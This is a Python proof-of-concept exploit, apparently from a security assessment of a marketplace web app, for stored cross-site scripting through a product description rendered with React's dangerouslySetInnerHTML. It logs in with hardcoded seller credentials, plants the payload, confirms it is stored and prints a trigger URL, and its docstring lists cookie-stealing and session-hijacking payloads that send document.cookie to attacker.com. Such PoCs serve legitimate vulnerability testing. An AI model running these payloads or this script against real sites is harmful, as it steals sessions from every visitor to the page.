#!/usr/bin/env python3
"""
XSS-1 — Stored XSS via Product Description
Endpoint : POST /api/products  (store payload)
Triggered: GET /products/{id}  (any user visits the product page)
Auth     : Seller account to plant payload; any user to trigger

The product detail page renders product.description via:
    <div dangerouslySetInnerHTML={{ __html: product.description }} />

React's default JSX escaping is bypassed. Any HTML/JS stored in the
description field is injected directly into the DOM when any user
views the product — including unauthenticated visitors.

A malicious seller creates a product whose description contains an
XSS payload. Every visitor to that product page executes it.

Payloads
--------
  Basic proof:   <img src=x onerror="alert(document.cookie)">
  Cookie steal:  <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
  Session hijack:<script>document.location='http://attacker.com/?c='+document.cookie</script>

Usage
-----
    python poc_015_stored_xss_product_description.py
    python poc_015_stored_xss_product_description.py --url http://localhost:8000 --payload "<img src=x onerror=alert(1)>"
"""

import argparse
import sys
import requests

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"

DEFAULT_PAYLOAD = '<img src=x onerror="alert(\'XSS: \'+document.cookie)">'


def banner():
    print("=" * 60)
    print("  XSS-1 — Stored XSS via Product Description")
    print("  Triggered: frontend /products/{id} page")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def plant_payload(base_url, token, payload):
    resp = requests.post(
        f"{base_url}/api/products",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "title": "Premium Wireless Headphones",
            "description": payload,
            "price": 49.99,
            "quantity": 100,
            "category": "Electronics",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def verify_stored(base_url, product_id, payload):
    resp = requests.get(f"{base_url}/api/products/{product_id}", timeout=10)
    resp.raise_for_status()
    stored = resp.json().get("description", "")
    return stored == payload


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload to inject")
    args = parser.parse_args()

    banner()
    print(f"[*] Target : {args.url}")
    print(f"[*] Payload: {args.payload}")
    print()

    token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD)
    print(f"[+] Authenticated as {SELLER_EMAIL}")

    product = plant_payload(args.url, token, args.payload)
    product_id = product["id"]
    print(f"[+] Product created (id={product_id})")

    if verify_stored(args.url, product_id, args.payload):
        print(f"[+] Payload confirmed stored verbatim in DB")
    else:
        print(f"[!] Stored description differs from payload — may have been modified")

    trigger_url = f"{args.url}/products/{product_id}"
    print()
    print(f"[+] ---- Trigger URL -------------------------------------------")
    print(f"    {trigger_url}")
    print(f"----------------------------------------------------------------")
    print(f"[*] Any user (including unauthenticated) visiting this URL will")
    print(f"    execute the payload via dangerouslySetInnerHTML in React.")
    print()
    print("[+] Done.")


if __name__ == "__main__":
    main()
